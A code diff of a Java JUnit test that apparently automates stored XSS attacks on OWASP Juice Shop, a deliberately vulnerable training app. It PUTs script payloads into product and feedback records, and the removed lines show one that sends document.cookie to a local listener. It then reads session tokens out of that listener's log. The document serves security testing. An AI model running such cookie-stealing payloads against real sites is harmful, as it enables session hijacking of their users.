@@ -4,6 +4,8 @@ import org.eclipse.jetty.server.Handler;
 import org.eclipse.jetty.server.NCSARequestLog;
 import org.eclipse.jetty.server.Server;
 import org.eclipse.jetty.server.handler.*;
+import org.json.simple.JSONObject;
+import org.json.simple.parser.JSONParser;
 import org.junit.AfterClass;
 import org.junit.Assert;
 import org.junit.BeforeClass;
@@ -20,14 +22,15 @@ import static io.restassured.RestAssured.given;
 public class JuiceShopXSS {
 
     private static Server server;
+    private static String payload;
+    private static int timeToReload = 15000;
 
     @BeforeClass
     public static void startTestPageServer() throws Exception {
         server = new Server(5555);
-
         configureJettyLogging();
-
         server.start();
+        loadProperties();
     }
 
     @AfterClass
@@ -36,21 +39,50 @@ public class JuiceShopXSS {
     }
 
     @Test
-    public void runTheAttack() {
+    public void xssTier3() {
         try {
-            loadProps();
-            placePayload();
+            setPayload("xss.json","payloadXSS3");
+            injectPayload("/api/Products/1");
             reloadPage();
-            evaluateResults();
-        } catch (Exception e) {
+            evaluateLogfile();
+        } catch (IOException e) {
             e.printStackTrace();
         }
     }
 
-    private void loadProps() throws IOException {
+    @Test
+    public void xssTier4(){
+        try {
+            setPayload("xss.json","payloadXSS4");
+            injectPayload("/api/Feedbacks");
+            reloadPage();
+            evaluateLogfile();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private static void configureJettyLogging() {
+        HandlerCollection handlers = new HandlerCollection();
+        ContextHandlerCollection contexts = new ContextHandlerCollection();
+        RequestLogHandler requestLogHandler = new RequestLogHandler();
+        handlers.setHandlers(new Handler[]{contexts,new DefaultHandler(),requestLogHandler});
+        server.setHandler(handlers);
+
+        NCSARequestLog requestLog = new NCSARequestLog("logs/jetty-request.log");
+        requestLog.setRetainDays(90);
+        requestLog.setAppend(false);
+        requestLog.setExtended(false);
+        requestLog.setLogTimeZone("GMT");
+        requestLogHandler.setRequestLog(requestLog);
+
+        System.out.println(">>> configureJettyLogging done.");
+    }
+
+    private static void loadProperties() throws IOException {
         Properties properties = new Properties();
 
-        try(InputStream stream = getClass().getClassLoader().getResourceAsStream("config.properties")){
+        try(InputStream stream = JuiceShopXSS.class.getClassLoader().getResourceAsStream("config.properties")){
             properties.load(stream);
         }
 
@@ -63,92 +95,56 @@ public class JuiceShopXSS {
             RestAssured.proxy(properties.getProperty("proxy_ip"), Integer.parseInt(properties.getProperty("proxy_port")));
         }
 
-        System.out.println(">>> loadProps done.");
+        System.out.println(">>> Properties loaded.");
 
     }
 
-    private void placePayload() {
+    private static void setPayload(String file, String payloadName) {
+            JSONParser jsonParser = new JSONParser();
+        try {
+            JSONObject jsonObj = (JSONObject) jsonParser.parse(new FileReader(JuiceShopXSS.class.getClassLoader().getResource("payloads/"+file).getFile()));
+            payload = jsonObj.get(payloadName).toString();
+            System.out.println(">>> Payload set: \""+payloadName+"\"");
+        }
+        catch (Exception e) {
+            System.err.println(">>> Something went wrong reading the payload from the sourcefile.");
+        }
+    }
 
-        String payloadXXS3 = "{" +
-                "\"id\": 1," +
-                "\"name\":" +
-                "\"Apple Juice (1000ml)\"," +
-                "\"description\": \"XSS Payload : " +
-                "<script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie</script>\"," +
-                "\"price\": 1.99," +
-                "\"image\": \"apple_juice.jpg\"," +
-                "\"createdAt\": \"2016-11-23 11:02:05.000 +00:00\"," +
-                "\"updatedAt\": \"2016-11-23 11:02:05.000 +00:00\"," +
-                "\"deletedAt\": null" +
-                "}";
+    private void injectPayload(String restPath) {
+
+        String payload = this.payload;
 
         RestAssured.basePath = "";
 
         given().
                 request().
-                body(payloadXXS3).
+                body(payload).
                 contentType(ContentType.JSON).
                 when().
-                put("/api/Products/1").
+                put(restPath).
                 then().
                 statusCode(200);
 
-        System.out.println(">>> placePayload done.");
+        System.out.println(">>> Payload placed in \""+restPath+"\"");
 
     }
 
     //TODO: Only a manual page reload runs the stored payload. Is there another possibility to refresh the page?
     private void reloadPage() {
-        RestAssured.
-                given().
-                header("Accept","application/json, text/plain, */*").
-                header("Referer","http://192.168.99.100:3000/").
-                header("Cache-Control","no-cache").
-                header("Cookie","token=something").
-                get("/rest/product/search?q=banana");
+        System.out.println(">>> Waiting "+timeToReload/1000+" seconds ...");
 
-        RestAssured.
-                given().
-                header("Accept","application/json, text/plain, */*").
-                header("Referer","http://192.168.99.100:3000/").
-                header("Cache-Control","no-cache").
-                header("Cookie","token=something").
-                get("/rest/product/search?q=apple");
-
-        System.out.println(">>> reloadPage done.");
-
-        //Sleeping here to have time for manual page reload.
         try {
-        Thread.sleep(10000);
+        Thread.sleep(timeToReload);
         } catch (Exception e) {
             e.printStackTrace();
         }
 
-        System.out.println(">>> Leaving jetty open for 10 seconds to have time for manual page reload ...");
+        System.out.println(">>> Continuing ...");
     }
 
-    private static void configureJettyLogging() {
-
-        HandlerCollection handlers = new HandlerCollection();
-        ContextHandlerCollection contexts = new ContextHandlerCollection();
-        RequestLogHandler requestLogHandler = new RequestLogHandler();
-        handlers.setHandlers(new Handler[]{contexts,new DefaultHandler(),requestLogHandler});
-        server.setHandler(handlers);
-
-        NCSARequestLog requestLog = new NCSARequestLog("jetty-request.log");
-        requestLog.setRetainDays(90);
-        requestLog.setAppend(false);
-        requestLog.setExtended(false);
-        requestLog.setLogTimeZone("GMT");
-        requestLogHandler.setRequestLog(requestLog);
-
-
-        System.out.println(">>> configureJettyLogging done.");
-
-    }
-
-    private void evaluateResults() throws IOException {
-        BufferedReader bufRead = new BufferedReader(new FileReader("jetty-request.log"));
+    private void evaluateLogfile() throws IOException {
+        BufferedReader bufRead = new BufferedReader(new FileReader("logs/jetty-request.log"));
         String line;
 
         if ((line = bufRead.readLine()) != null)
@@ -158,13 +154,14 @@ public class JuiceShopXSS {
                 Pattern p = Pattern.compile("token=\\S*");
                 Matcher m = p.matcher(line);
                 m.find();
-                System.out.println(">>> Token found: "+m.group());
+                System.out.println(">>> Token found: "+m.group(0));
 
             } else {
                 System.out.println(">>> No token was found. Is a user logged in?");
             }
         } else {
-            Assert.fail(">>> No jetty server log. Proxy on? Page refreshed manually?");
+            Assert.fail(">>> Jetty log seems to be empty ... \n- Did you refresh the page manually to execute the payload?\n" +
+                    "- Did your browser connect via the proxy?");
         }
     }
 }
